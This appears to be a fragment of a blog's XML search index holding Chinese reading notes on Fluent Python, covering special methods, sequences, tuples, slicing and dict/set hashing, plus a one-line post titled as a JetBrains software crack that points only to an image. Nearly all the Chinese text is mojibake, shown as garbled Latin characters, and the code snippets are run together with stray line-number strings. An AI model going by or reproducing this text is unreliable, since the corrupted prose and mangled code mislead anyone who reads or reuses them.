frozensetæä¾›äº†ä¸°å¯Œçš„åŠŸèƒ½å’Œæ“ä½œã€‚ set Literalsï¼ˆç¿»è¯‘æ¯”è¾ƒè¯¡å¼‚:é›†åˆå­—é¢é‡ï¼Ÿï¼Ÿï¼Ÿï¼‰å»ºç«‹ä¸€ä¸ªé›†åˆçš„æ—¶å€™å¯ä»¥ä½¿ç”¨{1ï¼Œ2..}ç±»ä¼¼çš„æ“ä½œï¼Œä½†æ˜¯åˆ›å»ºç©ºé›†çš„æ—¶å€™åªèƒ½ä½¿ç”¨set()æ„é€ æ–¹æ³•ã€‚ é›†åˆæ¨å¯¼(ç±»ä¼¼åˆ—è¡¨æ¨å¯¼)1&#123;chr(i) for i in range(32, 256) if 'SIGN' in name(chr(i),'')&#125; é›†åˆçš„æ“ä½œ dictå’Œsetçš„èƒŒåè¦ç†è§£Pythoné‡Œå­—å…¸å’Œé›†åˆçš„é•¿å¤„å’ŒçŸ­å¤„ï¼Œå®ƒä»¬èƒŒåçš„æ•£åˆ—è¡¨æ˜¯å¿…é¡»æ³¨æ„çš„ã€‚ Pythoné‡Œçš„å­—å…¸å’Œé›†åˆçš„æ•ˆç‡æœ‰å¤šé«˜ï¼Ÿ ç”±äºæ•£åˆ—è¡¨çš„å­˜åœ¨ï¼Œæ•ˆç‡æ˜¯éå¸¸é«˜çš„ï¼ˆåˆ—è¡¨ç”±äºæ²¡æœ‰æ•£åˆ—è¡¨ï¼Œè¡¨ç°éå¸¸å·®ï¼‰ dictçš„å®ç°åŠå…¶å¯¼è‡´çš„ç»“æœ é”®å¿…é¡»å¯æ•£åˆ—ï¼ˆhashableï¼‰ ä¸€ä¸ªå¯æ•£åˆ—çš„å¯¹è±¡å¿…é¡»æ»¡è¶³ä»¥ä¸‹è¦æ±‚ã€‚ (1) æ”¯æŒ hash() å‡½æ•°ï¼Œå¹¶ä¸”é€šè¿‡ hash() æ–¹æ³•æ‰€å¾—åˆ°çš„æ•£åˆ—å€¼æ˜¯ä¸å˜çš„ã€‚ (2) æ”¯æŒé€šè¿‡ eq() æ–¹æ³•æ¥æ£€æµ‹ç›¸ç­‰æ€§ã€‚ (3) è‹¥ a == b ä¸ºçœŸï¼Œåˆ™ hash(a) == hash(b) ä¹Ÿä¸ºçœŸã€‚æ‰€æœ‰ç”±ç”¨æˆ·è‡ªå®šä¹‰çš„å¯¹è±¡é»˜è®¤éƒ½æ˜¯å¯æ•£åˆ—çš„ï¼Œå› ä¸ºå®ƒä»¬çš„æ•£åˆ—å€¼ç”± id() æ¥è·å–ï¼Œè€Œä¸”å®ƒä»¬éƒ½æ˜¯ä¸ç›¸ç­‰çš„ã€‚ å†…å­˜å¼€é”€å·¨å¤§ ç”±äºä½¿ç”¨äº†æ•£åˆ—è¡¨ï¼Œè€Œæ•£åˆ—è¡¨æœ¬èº«ç¨€ç–ï¼Œä¼šå¯¼è‡´ç©ºé—´æ•ˆç‡ä½ä¸‹ã€‚ç©ºé—´çš„ä¼˜åŒ–å·¥ä½œå¯ä»¥ç­‰åˆ°çœŸæ­£éœ€è¦çš„æ—¶å€™å¼€å¯ï¼Œä¼˜åŒ–å¾€å¾€æ˜¯å¯ç»´æŠ¤æ€§çš„å¯¹ç«‹é¢ã€‚ é”®æŸ¥è¯¢å¿« ç”±äºåœ¨ç©ºé—´ä¸Šçš„å·¨å¤§èŠ±é”€ï¼Œä½¿å¾—æ—¶é—´ä¸Šçš„æ•ˆç‡å¾ˆé«˜ã€‚ é”®çš„æ¬¡åºå–å†³äºæ·»åŠ é¡ºåº ä¸å»ºç«‹hashè¡¨çš„æ—¶å€™å‘ç”Ÿçš„æ•£åˆ—å†²çªæœ‰å…³ã€‚ å¾€å­—å…¸é‡Œæ·»åŠ æ–°é”®å¯èƒ½ä¼šæ”¹å˜å·²æœ‰é”®çš„é¡ºåº è¿™ä¸ªå’Œæ•£åˆ—å†²çªæœ‰å…³ï¼Œæ‰€ä»¥æ…é‡è¿›è¡Œè¿­ä»£ä¸€ä¸ªå­—å…¸çš„æ‰€æœ‰é”®çš„è¿‡ç¨‹ä¸­åŒæ—¶å¯¹å­—å…¸è¿›è¡Œä¿®æ”¹è¿™ç§æ“ä½œï¼Œå¾ˆæœ‰å¯èƒ½ä¼šè·³è¿‡ä¸€äº›å·²æœ‰çš„é”®ã€‚ setçš„å®ç°å’Œå¯¼è‡´çš„ç»“æœç”±äºä¹Ÿæ˜¯åŸºäºæ•£åˆ—è¡¨å®ç°çš„ï¼Œsetçš„ç‰¹ç‚¹å’Œä¸Šä¸€å°èŠ‚æåˆ°çš„dictå¦‚å‡ºä¸€è¾™: é›†åˆé‡Œçš„å…ƒç´ å¿…é¡»å¯æ•£åˆ— å†…å­˜å¼€é”€å¤§ èƒ½å¾ˆå¿«æŸ¥è¯¢å…ƒç´ æ˜¯å¦å­˜åœ¨äºé›†åˆ å…ƒç´ çš„é¡ºåºå–å†³äºæ·»åŠ çš„é¡ºåº æ·»åŠ æ–°å…ƒç´ å¯èƒ½æ”¹å˜å·²æœ‰é¡ºåº]]></content>
      <categories>
        <category>è¯»ä¹¦ç¬”è®°</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>fluent python</tag>
        <tag>dict</tag>
        <tag>set</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[fluent python ç¬¬äºŒç« å°è®°]]></title>
    <url>%2F2017%2F11%2F11%2Ffluent-python-2%2F</url>
    <content type="text"><![CDATA[Fluent Python ç¬¬äºŒç« è¯»ä¹¦æŠ¥å‘Š Chapter 2. An Array of Sequencesåºåˆ—æ„æˆçš„æ•°ç»„ Pythonå†…ç½®åºåˆ—ï¼š ä¸€ç§åˆ†ç±»æ–¹å¼æ˜¯æ ¹æ®å­˜æ”¾æ•°æ®çš„æ–¹å¼åˆ†ç±»(æŒ‡é’ˆ/æ•°å€¼) å®¹å™¨åºåˆ—ï¼š list, tuple, collections.deque.è¿™ç±»åºåˆ—å¯ä»¥å­˜æ”¾ä¸åŒç±»å‹çš„æ•°æ®ï¼Œè¿™ç±»åºåˆ—å­˜æ”¾çš„éƒ½æ˜¯å¯¹è±¡çš„å¼•ç”¨(æŒ‡é’ˆ) æ‰å¹³åºåˆ—ï¼š str, bytes, bytearray, memoryview, array.array.åªèƒ½å­˜æ”¾ä¸€ç§æ•°æ®ç±»å‹ï¼Œç›¸æ¯”å®¹å™¨åºåˆ—ï¼Œè¿™ç±»åºåˆ—æ˜¯å°†å…ƒç´ çš„å€¼ç›´æ¥å­˜æ”¾åœ¨åºåˆ—å¯¹åº”çš„å†…å­˜ç©ºé—´ï¼Œè€Œä¸æ˜¯å°†å…ƒç´ å½“åšå•ç‹¬çš„å¯¹è±¡å­˜æ”¾ï¼Œè¿™ç±»åºåˆ—æ›´åŠ ç´§å‡‘ï¼Œä½†æ˜¯åªèƒ½å­˜æ”¾æ•°å­—ï¼Œå­—èŠ‚å’Œå­—ç¬¦ã€‚å¦ä¸€ç§åˆ†ç±»æ–¹å¼æ˜¯æ ¹æ®åºåˆ—å­˜æ”¾çš„å…ƒç´ æ˜¯å¦å¯å˜åˆ†ç±»ï¼š å¯å˜åºåˆ—ï¼š list, bytearray, array.array, collections.deque, memoryview ä¸å¯å˜åºåˆ—ï¼š tuple, str, and bytesåºåˆ—æ˜¯å¦å¯å˜å¯ä»¥é€šè¿‡ä¸‹é¢çš„å›¾ç›´è§‚å±•ç¤ºï¼šå›¾ä¸­åˆ—å‡ºçš„ç±»éƒ½æ¥è‡ªcollections.abc(abcæ˜¯ abstract base classesç¼©å†™)å¯ä»¥çœ‹åˆ°MutableSequenceæœ‰å¾ˆå¤šæ–¹æ³•ç»§æ‰¿è‡ªSequence(ç®­å¤´ç”±å­ç±»æŒ‡å‘è¶…ç±»ï¼Œæ–œä½“æŒ‡æŠ½è±¡ç±»å’ŒæŠ½è±¡æ–¹æ³•)ã€‚ åˆ—è¡¨æ¨å¯¼å’Œç”Ÿæˆå™¨è¡¨è¾¾å¼ 1.åˆ—è¡¨æ¨å¯¼ ä½¿ç”¨åˆ—è¡¨æ¨å¯¼é€šå¸¸å¯ä»¥è®©ä½ çš„Pythonä»£ç æ›´åŠ ç®€æ´å¯è¯»ï¼Œå¤§å¤šæ•°æƒ…å†µä¸‹ä¹Ÿä¼šæ›´å¿«ï¼Œæ¯”å¦‚ï¼š 1listi = [i**2 for i in xrange(10)] - Python2ä¸­åˆ—è¡¨æ¨å¯¼çš„è¡¨è¾¾å¼æ²¡æœ‰ç‹¬ç«‹çš„ä½œç”¨åŸŸï¼ŒPython3ä¸­å¾—åˆ°äº†æ”¹å–„ã€‚ - map/filter å¯ä»¥ä¸åˆ—è¡¨æ¨å¯¼å®Œæˆç›¸åŒçš„å·¥ä½œã€‚ 12345678910symbols = '$Â¢Â£Â¥â‚¬Â¤'beyond_ascii = [ord(s) for s in symbols if ord(s) &gt; 127]beyond_ascii = list(filter(lambda c: c &gt; 127, map(ord, symbols))) ``` - ç¤ºä¾‹ï¼šä½¿ç”¨åˆ—è¡¨æ¨å¯¼æ±‚ç¬›å¡å°”ç§¯ï¼š ```pythoncolors = ['black', 'white']sizes = ['S', 'M', 'L']tshirts = [(color, size) for color in colors for size in sizes] **2.ç”Ÿæˆå™¨è¡¨è¾¾å¼** - ç”Ÿæˆå™¨è¡¨è¾¾å¼èƒŒåéµå®ˆäº†è¿­ä»£å™¨åè®®ï¼Œå¯ä»¥é€ä¸ªåœ°äº§å‡ºå…ƒç´ ï¼Œè€Œä¸æ˜¯å…ˆå»ºç«‹ä¸€ä¸ªå®Œæ•´çš„åˆ—è¡¨ï¼Œç„¶åå†æŠŠè¿™ä¸ªåˆ—è¡¨ä¼ é€’åˆ°æŸä¸ªæ„é€ å‡½æ•°é‡Œã€‚è¿™æ ·å¯ä»¥æœ‰æ•ˆèŠ‚çœå†…å­˜ã€‚ - ç¤ºä¾‹ï¼šç”Ÿæˆä¸€ä¸ªarray: 12array.array('I', (ord(symbol) for symbol in symbols)) array('I', [36, 162, 163, 165, 8364, 164]) - åœ¨è®¡ç®—ç¬›å¡å°”ç§¯çš„è¿™ä¸ªé—®é¢˜ä¸­, ä¸åˆ—è¡¨æ¨å¯¼ä¸åŒçš„æ˜¯ï¼Œç”Ÿæˆå™¨è¡¨è¾¾å¼ä¼šåœ¨æ¯æ¬¡ for å¾ªç¯è¿è¡Œæ—¶æ‰ç”Ÿæˆä¸€ä¸ªç»„åˆ, è€Œä¸æ˜¯ä¸¤ä¸ªforå¾ªç¯ç”Ÿæˆä¸€ä¸ªå«æœ‰æ‰€æœ‰å…ƒç´ çš„åˆ—è¡¨ã€‚é¿å…äº†å†…å­˜çš„é¢å¤–å ç”¨ã€‚ï¼ˆè¿™ä¸ªä¸æ˜¯å¾ˆæ‡‚æ€ä¹ˆåšåˆ°çš„ï¼‰ **3.å…ƒç»„(tuple)** å…ƒç»„æ˜¯å¯¹ä¸€ç»„æ•°æ®çš„è®°å½•ï¼Œå­˜æ”¾äº†ä¸€ä¸ªæ•°æ®å’Œè¿™ä¸ªæ•°æ®å¯¹åº”çš„ä½ç½®ï¼Œè€Œä¸ä»…ä»…æ˜¯â€œä¸å¯å˜çš„åˆ—è¡¨â€ï¼Œå…ƒç»„ä¹Ÿæ˜¯å¯ä»¥åµŒå¥—çš„, å½“åšä¸å¯å˜åˆ—è¡¨æ—¶ï¼Œç¼ºå°‘é‚£äº›ä½¿å¾—è‡ªèº«å˜åŒ–çš„æ–¹æ³•ã€‚ - for å¾ªç¯å¯ä»¥åˆ†åˆ«æå–å…ƒç»„é‡Œçš„å…ƒç´ ï¼Œä¹Ÿå«ä½œæ‹†åŒ…ï¼ˆunpackingï¼‰ã€‚æ‹†åŒ…çš„ç”¨æ³•æœ‰å¾ˆå¤šï¼š 1. å¹³è¡Œèµ‹å€¼ï¼šæŠŠä¸€ä¸ªå¯è¿­ä»£å¯¹è±¡é‡Œçš„å…ƒç´ ï¼Œä¸€å¹¶èµ‹å€¼åˆ°ç”±å¯¹åº”çš„å˜é‡ç»„æˆçš„å…ƒç»„ä¸­ã€‚ 2. ä¸ä½¿ç”¨ä¸­é—´å˜é‡äº¤æ¢ä¸¤ä¸ªå˜é‡çš„å€¼ 3. ç”¨* è¿ç®—ç¬¦æŠŠä¸€ä¸ªå¯è¿­ä»£å¯¹è±¡æ‹†å¼€ä½œä¸ºå‡½æ•°çš„å‚æ•° 4. è®©ä¸€ä¸ªå‡½æ•°å¯ä»¥ç”¨å…ƒç»„çš„å½¢å¼è¿”å›å¤šä¸ªå€¼ æ‹†åŒ…æ—¶å¯ä»¥ç”¨å ä½ç¬¦_ å¸®åŠ©å¤„ç†ä¸æ„Ÿå…´è¶£çš„å…ƒç´ ï¼Œä¹Ÿå¯ä»¥æŠŠæ³¨æ„åŠ›æ”¾åœ¨ä¸€éƒ¨åˆ†å…ƒç´ ä¸Šï¼Œç”¨*å¤„ç†å‰©ä¸‹çš„å…ƒç´ ã€‚ ä¸€ä¸ªä¾‹å­ï¼š 1234567891011121314 t = (20, 8) quotient, remainder = divmod(*t) ``` **4.å…·åå…ƒç»„ï¼ˆnamedtupleï¼‰** collections.namedtuple æ˜¯ä¸€ä¸ªå·¥å‚å‡½æ•°ï¼Œå®ƒå¯ä»¥ç”¨æ¥æ„å»ºä¸€ä¸ªå¸¦å­—æ®µåçš„å…ƒç»„å’Œä¸€ä¸ªæœ‰åå­—çš„ç±» - ä¸€ä¸ªç®€å•çš„ç¤ºä¾‹ï¼š ```python from collections import namedtuple City = namedtuple('City', 'name country population coordinates') tokyo = City('Tokyo', 'JP', 36.933, (35.689722, 139.691667)) 5.åˆ‡ç‰‡ Pythonä¸­çš„åºåˆ—ç±»å‹éƒ½æ”¯æŒåˆ‡ç‰‡æ“ä½œã€‚ å¯¹å¯¹è±¡è¿›è¡Œåˆ‡ç‰‡:s[start:end:step] start:end:step è¿™ç§ç”¨æ³•åªèƒ½ä½œä¸ºç´¢å¼•æˆ–ä¸‹æ ‡ç”¨åœ¨[]ä¸­ã€‚ä½¿ç”¨æ—¶ä¼šè°ƒç”¨s.__getitem__(slice(start,end,step))è¿™ä¸ªæ–¹æ³•è¿™é‡Œçš„start:end:stepä¹Ÿå¯ä»¥æ›¿æ¢æˆslice(start,end,step),è¿™ç§æ–¹æ³•å¯ä»¥ç»™åˆ‡ç‰‡å‘½åï¼Œä½¿å¾—ä»£ç æ›´æœ‰å¯è¯»æ€§ã€‚ çœç•¥(â€¦)å’Œå¤šç»´åˆ‡ç‰‡ï¼Œæ ‡å‡†åº“ä¸­æš‚æ— ç”¨æ³•ï¼Œç”¨äºç”¨æˆ·è‡ªå®šä¹‰ç±»æˆ–è€…æ‹“å±•ï¼Œæ¯”å¦‚numpyã€‚ åˆ‡ç‰‡ä¹Ÿå¯ä»¥å°±åœ°ä¿®æ”¹å¯å˜åºåˆ—: å¦‚æœæŠŠåˆ‡ç‰‡æ”¾åœ¨èµ‹å€¼è¯­å¥çš„å·¦è¾¹ï¼Œæˆ–æŠŠå®ƒä½œä¸º del æ“ä½œçš„å¯¹è±¡ï¼Œæˆ‘ä»¬å°±å¯ä»¥å¯¹åºåˆ—è¿›è¡Œå«æ¥ã€åˆ‡é™¤æˆ–å°±åœ°ä¿®æ”¹æ“ä½œã€‚ 6. åºåˆ—çš„+å’Œ*æ“ä½œ å¦‚æœåœ¨ a * n è¿™ä¸ªè¯­å¥ä¸­ï¼Œåºåˆ— a é‡Œçš„å…ƒç´ æ˜¯å¯¹å…¶ä»–å¯å˜å¯¹è±¡çš„å¼•ç”¨çš„è¯,éœ€è¦æ ¼å¤–æ³¨æ„äº†,å¤åˆ¶åçš„å¼•ç”¨å¯èƒ½æŒ‡å‘åŒä¸€ä¸ªå¯¹è±¡ï¼Œä¿®æ”¹å…¶ä¸­ä¸€ä¸ªæ—¶ï¼Œå…¶ä»–å¼•ç”¨ä¹Ÿä¼šè¢«ä¿®æ”¹ã€‚ä¾‹å¦‚ï¼š &gt;&gt;&gt; s = [[1,1,1]]*3 &gt;&gt;&gt; s [[1, 1, 1], [1, 1, 1], [1, 1, 1]] &gt;&gt;&gt; s[0][0] = 2 &gt;&gt;&gt; s [[2, 1, 1], [2, 1, 1], [2, 1, 1]] å¢é‡èµ‹å€¼ï¼ˆ+=/*=ï¼‰: += èƒŒåçš„ç‰¹æ®Šæ–¹æ³•æ˜¯__iadd__(), åœ¨a+=bä¸­ï¼Œå¦‚æœaå®ç°äº†__iadd__(),è¿™ä¸ªè¡¨è¾¾å¼ä¼šç«‹åˆ»æ”¹å˜aè¿™ä¸ªå¯¹è±¡ï¼Œå¦‚æœæ²¡æœ‰å®ç°è¿™ä¸ªæ–¹æ³•,è¿™ä¸ªè¡¨è¾¾å¼å°±ä¼šå®Œæˆa = a+b çš„æ“ä½œ,å³åˆ›å»ºa+bè¿™ä¸ªå¯¹è±¡ï¼Œå°†å˜é‡aæŒ‡å‘æ–°çš„å˜é‡ã€‚*=ä¹Ÿç±»ä¼¼ï¼Œä¸è¿‡èƒŒåçš„ç‰¹æ®Šæ–¹æ³•æ˜¯imul() ä¸€ä¸ªç‰¹æ®Šçš„ä¾‹å­ï¼š &gt;&gt;&gt; t = (1, 2, [30, 40]) &gt;&gt;&gt; t[2] += [50, 60] Traceback (most recent call last): File "&lt;stdin&gt;", line 1, in &lt;module&gt; TypeError: 'tuple' object does not support item assignment &gt;&gt;&gt; t (1, 2, [30, 40, 50, 60]) 7. sortæ–¹æ³•å’Œsortedå‡½æ•°list.sortå‡½æ•°ä¼šå°±åœ°ä¿®æ”¹åˆ—è¡¨ï¼Œè¿”å›å€¼ä¸ºNone.sortedå‡½æ•°ä¼šæ–°å»ºä¸€ä¸ªæ’å¥½åºçš„åˆ—è¡¨ä½œä¸ºè¿”å›å€¼ä»–ä»¬éƒ½æ¥æ”¶ä¸¤ä¸ªå‚æ•°reverse(æ˜¯å¦åè½¬) å’Œkey(æ’åºæ‰€ç”¨çš„å€¼) 8. bisectç”¨äºç®¡ç†å·²æ’åºçš„åºåˆ—bisect æ¨¡å—åŒ…å«ä¸¤ä¸ªä¸»è¦å‡½æ•°ï¼Œbisect å’Œ insortï¼Œä¸¤ä¸ªå‡½æ•°éƒ½åˆ©ç”¨äºŒåˆ†æŸ¥æ‰¾ç®—æ³•æ¥åœ¨æœ‰åºåºåˆ—ä¸­æŸ¥æ‰¾æˆ–æ’å…¥å…ƒç´ ã€‚bisect(haystack,needle)haystack.insert(index, needle)bisort(seq, num) 9. å½“åˆ—è¡¨ä¸æ˜¯é¦–é€‰æ—¶ æ•°ç»„ï¼ˆarrayï¼‰:å¦‚æœåˆ—è¡¨åªåŒ…å«çº¯æ•°å­—ï¼Œarray.arrayæ¯”listé«˜æ•ˆ å†…å­˜è§†å›¾ã€NumPy SciPy, åŒå‘é˜Ÿåˆ—ï¼ˆcollections.dequeï¼‰]]></content>
      <categories>
        <category>è¯»ä¹¦ç¬”è®°</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>fluent python</tag>
        <tag>sequence</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jetbrainç³»åˆ—è½¯ä»¶ç ´è§£]]></title>
    <url>%2F2017%2F09%2F26%2Fjetbrain_crack%2F</url>
    <content type="text"><![CDATA[ç ´è§£æ–¹å¼å¦‚å›¾]]></content>
      <categories>
        <category>æŠ€æœ¯åˆ†äº«</category>
      </categories>
      <tags>
        <tag>software</tag>
        <tag>crack</tag>
        <tag>jetbrains</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[fluent python ç¬¬ä¸€ç« å°è®°]]></title>
    <url>%2F2017%2F07%2F14%2Ffluent-python-chapter1-note%2F</url>
    <content type="text"><![CDATA[Fluent Python ç¬¬ä¸€ç« è¯»ä¹¦ç¬”è®° Chapter 1. The Python Data ModelPythonæ•°æ®æ¨¡å‹ ç‰¹æ®Šæ–¹æ³•ï¼šmagic method/dunder method (double underscores (i.e., __getitem__())) ç‰¹æ®Šæ–¹æ³•ä½¿å¯¹è±¡èƒ½å®ç°ï¼Œæ”¯æŒåŸºæœ¬çš„è¯­è¨€æ¡†æ¶å¹¶ä¸ä¹‹äº¤äº’,ä¾‹å¦‚ï¼š Iteration è¿­ä»£ Collections é›†åˆ Attribute access è®¿é—®å±æ€§ Operator overloading è¿ç®—ç¬¦é‡è½½ Function and method invocation å‡½æ•°å’Œæ–¹æ³•è°ƒç”¨ Object creation and destruction å¯¹è±¡çš„åˆ›å»ºå’Œé”€æ¯ String representation and formatting å­—ç¬¦ä¸²è¡¨ç¤ºå’Œæ ¼å¼åŒ– Managed contexts (i.e., with blocks) ç®¡ç†ä¸Šä¸‹æ–‡ namedtupleçš„ä½¿ç”¨ï¼š 12345678910&gt;&gt;&gt; import collections&gt;&gt;&gt; Card = collections.namedtuple('Card', ['x','y']) &gt;&gt;&gt; card = Card(11,22) &gt;&gt;&gt; print card.x11&gt;&gt;&gt; print card.y22 &gt;&gt;&gt; x, y = card&gt;&gt;&gt; print x,y11 22 ä½¿ç”¨ç‰¹æ®Šæ–¹æ³•çš„å¥½å¤„ï¼š ç±»çš„ä½¿ç”¨è€…ä¸éœ€è¦è®°å¿†éšæ„å®šä¹‰çš„æ ‡å‡†æ–¹æ³•åã€‚ï¼ˆä¾‹å¦‚ï¼šæ€æ ·è·å–å¯¹è±¡ä¸­å…ƒç´ çš„æ•°é‡ï¼Œ.size()? .length()? å¦‚æœç”¨ç‰¹æ®Šæ–¹æ³•__len__()å¯ä»¥ç›´æ¥è°ƒç”¨len(object)ï¼‰ ç±»çš„ä½¿ç”¨è€…æ›´å®¹æ˜“ä»Pythonåºå¤§çš„æ ‡å‡†åº“ä¸­è·ç›Šï¼Œå¹¶ä¸”å¯ä»¥é¿å…é‡é€ è½®å­ï¼ˆä¾‹å¦‚ï¼šrandom.choiceå‡½æ•°ï¼‰ __getitem__()æ–¹æ³•ä½¿å¾—ç±»å¯ä»¥è¿›è¡Œè¿­ä»£(iterable),å¯ä»¥è¿›è¡Œåˆ‡ç‰‡(index slicing) ä½¿ç”¨ç‰¹æ®Šæ–¹æ³•éœ€è¦æ³¨æ„çš„ï¼š ç‰¹æ®Šæ–¹æ³•ä¸æ˜¯ç»™äººç”¨çš„ï¼Œè€Œæ˜¯ç»™Pythonè§£é‡Šå™¨ç”¨çš„ï¼Œä¸€èˆ¬æˆ‘ä»¬ç”¨len(my_obj)è€Œä¸æ˜¯my_obj.__len__() å¯¹äºlist, str, bytearrayä¹‹ç±»çš„å†…ç½®ç±»å‹ï¼Œä½¿ç”¨len()æ—¶ï¼ŒCPython è§£é‡Šå™¨ç›´æ¥è¿”å›PyVarObjectçš„ob_sizeè¿™ä¸ªå±æ€§çš„å€¼ï¼Œè¿™æ¯”è°ƒç”¨len()æ–¹æ³•å¿«å¾—å¤šã€‚PyVarObjectæ˜¯ä¸€ä¸ªä»£è¡¨æ‰€æœ‰å¯å˜é•¿åº¦å¯¹è±¡çš„Cè¯­è¨€ç»“æ„ä½“ã€‚ ä¸€èˆ¬å¯¹ç‰¹æ®Šæ–¹æ³•çš„è°ƒç”¨éƒ½æ˜¯éšå¼çš„ï¼Œæ¯”å¦‚forè¯­å¥éšå¼åœ°è°ƒç”¨äº†iter()å‡½æ•° é€šè¿‡å†…ç½®çš„å‡½æ•°ï¼ˆä¾‹å¦‚ lenã€iterã€strï¼Œç­‰ç­‰ï¼‰æ¥ä½¿ç”¨ç‰¹æ®Šæ–¹æ³•æ˜¯æœ€å¥½çš„é€‰æ‹©ã€‚è¿™äº›å†…ç½®å‡½æ•°ä¸ä»…ä¼šè°ƒç”¨ç‰¹æ®Šæ–¹æ³•ï¼Œé€šå¸¸è¿˜æä¾›é¢å¤–çš„å¥½å¤„(ä¸Šé¢æåˆ°è¿‡)ï¼Œè€Œä¸”å¯¹äºä¸€äº›å†…ç½®çš„ç±»æ¥è¯´ï¼Œè°ƒç”¨å‡½æ•°çš„é€Ÿåº¦æ›´å¿«ã€‚ ä¸è¦éšæ„ä½¿ç”¨ç‰¹æ®Šæ–¹æ³•çš„å‘½åæ–¹å¼å‘½åä¸€èˆ¬çš„æ–¹æ³•ï¼Œå¯èƒ½ä¼šé€ æˆæ··æ·†ã€‚ ç‰¹æ®Šæ–¹æ³•ä½¿ç”¨çš„ä¸¾ä¾‹(æ„é€ å‘é‡)ï¼š å¯¹è±¡çš„å­—ç¬¦ä¸²è¡¨ç¤ºï¼šå¦‚æœæ²¡æœ‰å®ç°__repr__è¿™ä¸ªç‰¹æ®Šæ–¹æ³•ï¼Œæ§åˆ¶å°å°±ä¼šå‡ºç° è¿™æ ·çš„è¡¨ç¤ºï¼Œè€Œå¦‚æœæˆ‘ä»¬å®ç°äº†è¿™ä¸ªæ–¹æ³•ï¼Œæ§åˆ¶å°å°±èƒ½å°†å¯¹è±¡çš„è¯¦ç»†ä¿¡æ¯æ‰“å°å‡ºæ¥ã€‚__repr__æ–¹æ³•ä¸­å¯ä»¥ä½¿ç”¨%r è·å–ä¸åŒç±»å‹å±æ€§çš„æ ‡å‡†å­—ç¬¦ä¸²è¡¨ç¤ºï¼Œæ¯”å¦‚Vector(1, 2) æˆ– Vector(â€˜1â€™, â€˜2â€™)__repr__ éœ€è¦å°½å¯èƒ½æ²¡æœ‰æ­§ä¹‰ï¼Œå¹¶ä¸”æç¤ºå¦‚ä½•ä½¿ç”¨ç±»åˆ›å»ºç›¸åŒçš„å˜é‡ä¸__str__çš„ä¸åŒä¹‹å¤„åœ¨äºï¼Œ __str__åœ¨str()å‡½æ•°æˆ–è€… printå¯¹è±¡æ—¶ä¼šè¢«è°ƒç”¨ï¼Œ__str__ç”¨äºå±•ç¤ºé€‚åˆå±•ç¤ºç»™ç»ˆç«¯ç”¨æˆ·çš„ä¿¡æ¯ã€‚å¦‚æœäºŒè€…åªèƒ½é€‰å…¶ä¸­ä¸€ä¸ªåˆ›å»ºï¼Œé‚£ä¹ˆ__repr__æ˜¯æ¯”è¾ƒå¥½çš„é€‰æ‹©ï¼Œå› ä¸ºPythonè§£é‡Šå™¨åœ¨æ‰¾ä¸åˆ°__str__æ—¶ä¼šè°ƒç”¨__repr__ä½œä¸ºæ›¿ä»£ã€‚(StackOverflow) ç®—æœ¯è¿ç®—ï¼šä¸Šé¢çš„å‘é‡å¯¹è±¡ä½¿ç”¨__add__å’Œ__mul__å®ç°äº†+å’Œ*è¿ç®—ã€‚è¿™ä¸¤ä¸ªè¿ç®—çš„å®ç°éƒ½æ˜¯æ„é€ äº†æ–°çš„å¯¹è±¡ï¼Œè€Œä¸æ˜¯å¯¹åŸæ¥çš„å¯¹è±¡è¿›è¡Œæ”¹åŠ¨ã€‚å®é™…ä¸Šè¿™ä¹Ÿæ˜¯ä¸­ç¼€è¿ç®—çš„åŸºæœ¬è¦æ±‚ã€‚ å¸ƒå°”è¿ç®—: Pythonä¸­çš„å¯¹è±¡åœ¨éœ€è¦çš„åœºæ™¯(æ¯”å¦‚if, while)å¯ä»¥ä½œä¸ºboolå€¼ä½¿ç”¨ã€‚ä¸€èˆ¬ç”¨æˆ·è‡ªå®šä¹‰çš„å¯¹è±¡éƒ½è¢«é»˜è®¤ä¸ºTrueï¼Œä½†æ˜¯å¦‚æœå¯¹è±¡å®ç°äº†__bool__æˆ–è€…__len__ï¼Œæƒ…å†µå°±ä¸ä¸€æ ·äº†ã€‚å¦‚æœå®ç°äº†__bool__,å¯¹è±¡çš„å¸ƒå°”å€¼è§†ä¸ºbool()çš„è¿”å›å€¼ï¼›å¦‚æœæ²¡æœ‰å®ç°__bool__è€Œå®ç°äº†__len__ï¼Œé‚£ä¹ˆlen()ä¸º0çš„å¯¹è±¡å°±è¢«è§†ä¸ºFalseã€‚ ç‰¹æ®Šæ–¹æ³•ä¸€è§ˆï¼š The Python Language Referenceçš„â€œData Modelâ€è¿™ä¸€ç« èŠ‚åˆ—å‡ºäº†83ä¸ªç‰¹æ®Šæ–¹æ³•ï¼Œå…¶ä¸­æœ‰47ä¸ªç”¨äºå®ç°ç®—æœ¯è¿ç®—ï¼Œä½è¿ç®—å’Œæ¯”è¾ƒã€‚ å°ç»“ï¼š é€šè¿‡å®ç°ç‰¹æ®Šå‡½æ•°ï¼Œè‡ªå®šä¹‰çš„å¯¹è±¡å¯ä»¥è¡¨ç°å¾—æ›´åƒæ˜¯å†…ç½®çš„å¯¹è±¡ï¼ŒåŒæ—¶ä½¿å¾—å¯¹è±¡çš„ä½¿ç”¨æ›´åŠ ä¾¿æ·ï¼Œæ›´åŠ Pythonic Pythonè‡ªå®šä¹‰å¯¹è±¡çš„ä¸€ä¸ªåŸºæœ¬è¦æ±‚æ˜¯æä¾›è‡ªèº«çš„å¯ç”¨çš„å­—ç¬¦ä¸²è¡¨ç¤ºã€‚ä¸€ä¸ªç”¨é€”æ˜¯å¼€å‘è€…ç”¨äºdebugå’Œæ‰“å°logï¼Œå¦ä¸€ä¸ªç”¨æ³•æ˜¯ç»ˆç«¯ç”¨æˆ·æŸ¥çœ‹å¯¹è±¡çš„ä¿¡æ¯ã€‚è¿™ä¸¤ä¸ªåŠŸèƒ½åˆ†åˆ«ç”¨__repr__å’Œ__str__å®ç° å¯¹åºåˆ—ç±»å‹çš„å¯¹è±¡çš„æ¨¡æ‹Ÿæ˜¯ç‰¹æ®Šæ–¹æ³•ä½¿ç”¨æœ€å¹¿æ³›çš„åœºæ™¯ï¼Œæ¯”å¦‚å‰é¢æåˆ°çš„FrenchDeck Python 